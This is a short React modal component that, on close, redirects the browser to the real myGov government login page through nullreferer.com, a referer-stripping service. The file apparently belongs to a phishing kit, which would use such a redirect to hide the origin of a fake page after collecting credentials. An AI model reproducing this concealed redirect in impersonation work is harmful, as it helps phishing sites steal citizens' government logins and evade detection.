import React from 'react'
import Box from '@mui/material/Box';
import Button from '@mui/material/Button';
import Typography from '@mui/material/Typography';
import Modal from '@mui/material/Modal';
import Snackback from './Snackback';

const style = {
  position: 'absolute',
  top: '50%',
  left: '50%',
  transform: 'translate(-50%, -50%)',
  width: 400,
  bgcolor: '',
  border: '2px solid #000',
  boxShadow: 24,
  p: 0,
};


const ModalOpen = ({handleOpen,open,setOpen}) => {
    
    const handleClose = () => {
        setOpen(false);
        window.location.href = 'https://nullreferer.com/?https://login.my.gov.au/las/mygov-login?execution=e1s1';
    }
  
    return (
      <div>
        {/* <Button onClick={handleOpen}>Open modal</Button> */}
        <Modal
          open={open}
          onClose={handleClose}
          aria-labelledby="modal-modal-title"
          aria-describedby="modal-modal-description"
        >
          <Box sx={style}>
            <Snackback />
          </Box>
        </Modal>
      </div>
    );
}

export default ModalOpen